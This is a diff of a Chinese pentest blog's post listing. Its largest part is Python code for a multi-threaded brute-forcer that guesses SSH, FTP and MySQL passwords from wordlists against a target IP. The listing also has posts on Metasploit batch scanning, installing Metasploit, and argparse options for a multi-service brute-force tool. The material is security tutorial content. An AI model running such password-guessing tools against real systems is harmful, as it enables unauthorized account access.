+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>thread</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>            name,pwd <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>get()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>                conn <span style=color:#f92672>=</span> MySQLdb<span style=color:#f92672>.</span>connect(host<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>host, user<span style=color:#f92672>=</span>name, passwd<span style=color:#f92672>=</span>pwd, db<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;mysql&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>3306</span>)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> conn:
+</span></span><span style=display:flex><span>                    <span style=color:#75715e># time.sleep(0.05)</span>
+</span></span><span style=display:flex><span>                    conn<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>                s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[OK] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (name,pwd)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,s)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>result<span style=color:#f92672>.</span>append(s)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> socket<span style=color:#f92672>.</span>timeout:
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,<span style=color:#e6db74>&#34;Timeout&#34;</span>)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>put(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>+</span> pwd)
+</span></span><span style=display:flex><span>                time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>3</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>, e:
+</span></span><span style=display:flex><span>                error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[Error] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (name,pwd)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,error)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>run</span>(self):
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>get_queue()
+</span></span><span style=display:flex><span>        starttime <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        threads <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,self<span style=color:#f92672>.</span>threadnum<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>):
+</span></span><span style=display:flex><span>            t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>thread)
+</span></span><span style=display:flex><span>            threads<span style=color:#f92672>.</span>append(t)
+</span></span><span style=display:flex><span>            t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>) <span style=color:#75715e>#主线程完成后不管子线程有没有结束，直接退出</span>
+</span></span><span style=display:flex><span>            t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>is_exit <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;Exit the program...&#34;</span>
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Waiting...&#34;</span>
+</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>show_result(self<span style=color:#f92672>.</span>host,self<span style=color:#f92672>.</span>result)
+</span></span><span style=display:flex><span>        finishetime <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Used time: </span><span style=color:#e6db74>%f</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (finishetime<span style=color:#f92672>-</span>starttime)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    parser <span style=color:#f92672>=</span> OptionParser(usage<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Usage: python %prog [options] type&#39;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#39;-i&#39;</span>,<span style=color:#e6db74>&#39;--host&#39;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;host&#39;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;target ip&#39;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#39;-o&#39;</span>,<span style=color:#e6db74>&#39;--timeout&#39;</span>,type<span style=color:#f92672>=</span>int,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;timeout&#39;</span>,default<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;timeout&#39;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#39;-t&#39;</span>,<span style=color:#e6db74>&#39;--thread&#39;</span>,type<span style=color:#f92672>=</span>int,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;threadnum&#39;</span>,default<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;threadnum&#39;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#39;-L&#39;</span>,<span style=color:#e6db74>&#39;--userfile&#39;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;userfile&#39;</span>,default<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;username.txt&#39;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;userfile&#39;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#39;-P&#39;</span>,<span style=color:#e6db74>&#39;--passfile&#39;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;passfile&#39;</span>,default<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;password.txt&#39;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;passfile&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    (options, args) <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> args:
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>print_help()
+</span></span><span style=display:flex><span>        exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;ssh&#39;</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> options<span style=color:#f92672>.</span>host:
+</span></span><span style=display:flex><span>            ssh <span style=color:#f92672>=</span> SshBruter(options, args)
+</span></span><span style=display:flex><span>            ssh<span style=color:#f92672>.</span>run()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            parser<span style=color:#f92672>.</span>print_help()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> args[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;ftp&#39;</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> options<span style=color:#f92672>.</span>host:
+</span></span><span style=display:flex><span>            ftp <span style=color:#f92672>=</span> FtpBruter(options, args)
+</span></span><span style=display:flex><span>            ftp<span style=color:#f92672>.</span>run()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            parser<span style=color:#f92672>.</span>print_help()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> args[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;mysql&#39;</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> options<span style=color:#f92672>.</span>host:
+</span></span><span style=display:flex><span>            mysql <span style=color:#f92672>=</span> MysqlBruter(options, args)
+</span></span><span style=display:flex><span>            mysql<span style=color:#f92672>.</span>run()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            parser<span style=color:#f92672>.</span>print_help()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;type must be ssh or ftp or mysql&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><h3 id=0x01-尝试爆破>0x01 尝试爆破</h3><p><img src=/img/post/bruter_help.png alt=帮助信息></p><a href=https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/>Metasploit 利用 workspace 进行批量扫描爆破</a></h1><div class=post-meta><time>2016-08-23</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>,<a href=/tags/tools>tools</a>)</div><div class=summary-body><p><h3 id=0x00-启动>0x00 启动</h3><p><img src=/img/post/msf_start.png alt=启动msf></p><h3 id=0x01-metasploit的工作平台>0x01 Metasploit的工作平台</h3><p>在msf里的工作平台可以保存历史的一些操作信息
+<img src=/img/post/msf_workspace_h.png alt=msf工作平台的帮助信息>
+<img src=/img/post/msf_workspace.png alt=创建新的工作平台></p><h3 id=0x02-使用db_nmap扫描主机>0x02 使用db_nmap扫描主机</h3><p><img src=/img/post/msf_nmap_lanou3g_ip.png alt=扫描lanou3g的ip信息>
+扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：
+<img src=/img/post/msf_hosts.png alt=查看主机列表>
+<img src=/img/post/msf_services.png alt=查看服务></p><a href=https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/ubuntu-install-metasploit/>Ubuntu 下安装 Metasploit</a></h1><div class=post-meta><time>2016-08-18</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/tools>tools</a>,<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><h3 id=0x00-安装metasploit>0x00 安装Metasploit</h3><ul><li>下载msfinstall脚本</li></ul><pre tabindex=0><code>$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+</code></pre><ul><li>修改文件权限</li></ul><pre tabindex=0><code>$ chmod 755 msfinstall
+</code></pre><ul><li>安装(可能时间较久)</li></ul><pre tabindex=0><code>$ ./msfinstall
+</code></pre><ul><li>更新exp</li></ul><pre tabindex=0><code>$ msfupdate
+</code></pre><h3 id=0x01-连接数据库>0x01 连接数据库</h3><ul><li>首先启动postgresql数据库</li></ul><pre tabindex=0><code>$ /etc/init.d/postgresql start #service postgresql start也可以
+</code></pre><ul><li>初始化MSF数据库(关键步骤)</li></ul><pre tabindex=0><code>$ msfdb init
+</code></pre><ul><li>运行msfconsole</li></ul><pre tabindex=0><code>$ msfconsole
+</code></pre><ul><li>在msf中查看数据库连接状态</li></ul><pre tabindex=0><code>msf &gt; db_status
+#若出现错误：Module database cache not built yet, using slow search
+#则重新构建缓存，缓存构建通常需要5-10分钟左右。
+#构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块
+msf &gt; db_rebuild_cache
+</code></pre><h3 id=0x02-metasploit-cheat-sheet>0x02 Metasploit Cheat Sheet</h3><p>常见命令可以看下 <a href=https://www.comparitech.com/net-admin/metasploit-cheat-sheet/?_blank>https://www.comparitech.com/net-admin/metasploit-cheat-sheet/</a></p><a href=https://wyb0.com/posts/2016/ubuntu-install-metasploit/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/python-parames-parse/>Python 命令行参数解析</a></h1><div class=post-meta><time>2016-08-16</time>
+[<a href=/categories/Python>Python</a>](<a href=/tags/python>python</a>,<a href=/tags/module>module</a>)</div><div class=summary-body><p><h3 id=0x00-argparse-模块>0x00 argparse 模块</h3><p>参考 <a href=https://docs.python.org/zh-cn/3.7/library/argparse.html?_blank>https://docs.python.org/zh-cn/3.7/library/argparse.html</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> argparse
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Parser</span>(object):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Parser&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self):
+</span></span><span style=display:flex><span>        super(Parser, self)<span style=color:#f92672>.</span>__init__()
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>service_type_list <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;ssh&#34;</span>,<span style=color:#e6db74>&#34;telnet&#34;</span>,<span style=color:#e6db74>&#34;ftp&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;mysql&#34;</span>,<span style=color:#e6db74>&#34;mssql&#34;</span>,<span style=color:#e6db74>&#34;oracle&#34;</span>,<span style=color:#e6db74>&#34;pgsql&#34;</span>,<span style=color:#e6db74>&#34;redis&#34;</span>
+</span></span><span style=display:flex><span>        ]
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;debug&#34;</span>, <span style=color:#e6db74>&#34;info&#34;</span>, <span style=color:#e6db74>&#34;warning&#34;</span>, <span style=color:#e6db74>&#34;error&#34;</span>, <span style=color:#e6db74>&#34;critical&#34;</span>]
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>example <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;Example:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                          </span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>  python3 </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> -s ssh -i 123.123.123.123
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                          </span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>  python3 </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> -s ssh -i 123.123.123.123/24 -l root -p 123456&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>parser</span>(self):
+</span></span><span style=display:flex><span>        parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(
+</span></span><span style=display:flex><span>            formatter_class<span style=color:#f92672>=</span>argparse<span style=color:#f92672>.</span>RawDescriptionHelpFormatter,<span style=color:#75715e>#使 example 可以换行</span>
+</span></span><span style=display:flex><span>            add_help<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
+</span></span><span style=display:flex><span>            <span style=color:#75715e># description = &#34;常见服务口令爆破&#34;,</span>
+</span></span><span style=display:flex><span>            )
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>epilog <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>example<span style=color:#f92672>.</span>format(parser<span style=color:#f92672>.</span>prog,parser<span style=color:#f92672>.</span>prog)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-i&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;host&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Target ip&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-iL&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;host_file&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Target file name, one ip per line&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-l&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-p&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pwd&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-lp&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user_pwd_file&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user_pwd file, example: username:password&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-L&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user_file&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username file&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-P&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pwd_file&#34;</span>, type<span style=color:#f92672>=</span>str, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password file&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;--port&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;port&#34;</span>, type<span style=color:#f92672>=</span>int, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Target port&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-s&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;service_type&#34;</span>, type<span style=color:#f92672>=</span>str, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, 
+</span></span><span style=display:flex><span>                            choices<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>service_type_list, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Service type&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-t&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;thread_num&#34;</span>, type<span style=color:#f92672>=</span>int, default<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;The number of threads, default is 10 threads&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-T&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;timeout&#34;</span>, type<span style=color:#f92672>=</span>int, default<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>, 
+</span></span><span style=display:flex><span>                            help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Timeout, default is 10s&#34;</span>)
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-v&#34;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;log_level&#34;</span>, type<span style=color:#f92672>=</span>str, default<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;info&#34;</span>, 
+</span></span><span style=display:flex><span>                            choices<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>log_level, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Log Level, default is &#39;info&#39;&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># args = parser.parse_args()</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># parser.print_help()</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> parser
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@staticmethod</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init</span>():
+</span></span><span style=display:flex><span>        parser <span style=color:#f92672>=</span> Parser()<span style=color:#f92672>.</span>parser()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> parser
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    parser <span style=color:#f92672>=</span> Parser()<span style=color:#f92672>.</span>init()
+</span></span><span style=display:flex><span>    args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>print_help()
+</span></span></code></pre></div><h3 id=0x02-运行>0x02 运行</h3><pre tabindex=0><code>➜  python3 tmp.py
+usage: tmp.py [-h] [-i HOST] [-iL HOST_FILE] [-l USER] [-p PWD]
+              [-lp USER_PWD_FILE] [-L USER_FILE] [-P PWD_FILE] [--port PORT]
+              -s {ssh,telnet,ftp,mysql,mssql,oracle,pgsql,redis}
+              [-t THREAD_NUM] [-T TIMEOUT]
+              [-v {debug,info,warning,error,critical}]
+tmp.py: error: the following arguments are required: -s
+</code></pre><pre tabindex=0><code>➜  python3 tmp.py -s ssh
+usage: tmp.py [-h] [-i HOST] [-iL HOST_FILE] [-l USER] [-p PWD]
+              [-lp USER_PWD_FILE] [-L USER_FILE] [-P PWD_FILE] [--port PORT]
+              -s {ssh,telnet,ftp,mysql,mssql,oracle,pgsql,redis}
+              [-t THREAD_NUM] [-T TIMEOUT]
+              [-v {debug,info,warning,error,critical}]
 
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
+optional arguments:
+  -h, --help            show this help message and exit
+  -i HOST               Target ip
+  -iL HOST_FILE         Target file name, one ip per line
+  -l USER               username
+  -p PWD                password
+  -lp USER_PWD_FILE     user_pwd file, example: username:password
+  -L USER_FILE          username file
+  -P PWD_FILE           password file
+  --port PORT           Target port
+  -s {ssh,telnet,ftp,mysql,mssql,oracle,pgsql,redis}
+                        Service type
+  -t THREAD_NUM         The number of threads, default is 10 threads
+  -T TIMEOUT            Timeout, default is 10s
+  -v {debug,info,warning,error,critical}
+                        Log Level, default is &#39;info&#39;
 
-    <div id="content">
-      
-	<main>
-		
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/python-password-generator/">Python 实现密码生成器</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-29</time>
-    [<a href="/categories/Python">Python</a>](<a href="/tags/python">python</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 简介 有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则<a href="https://wyb0.com/posts/2016/python-password-generator/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/">Python 实现多线程弱口令爆破</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-26</time>
-    [<a href="/categories/Pentest">Pentest</a>,<a href="/categories/Python">Python</a>](<a href="/tags/python">python</a>,<a href="/tags/%E7%88%86%E7%A0%B4">爆破</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;this script can bruter ftp/ssh/mysql&#39; __author__ = &#39;reber&#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类<a href="https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/">Metasploit 利用 workspace 进行批量扫描爆破</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-23</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>,<a href="/tags/tools">tools</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的<a href="https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/ubuntu-install-metasploit/">Ubuntu 下安装 Metasploit</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-18</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/tools">tools</a>,<a href="/tags/intranet">intranet</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 安装Metasploit 下载msfinstall脚本 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall 修改文件权限 $ chmod 755 msfinstall 安装(可能时间较久) $ ./msfinstall 更新exp $<a href="https://wyb0.com/posts/2016/ubuntu-install-metasploit/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/python-parames-parse/">Python 命令行参数解析</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-16</time>
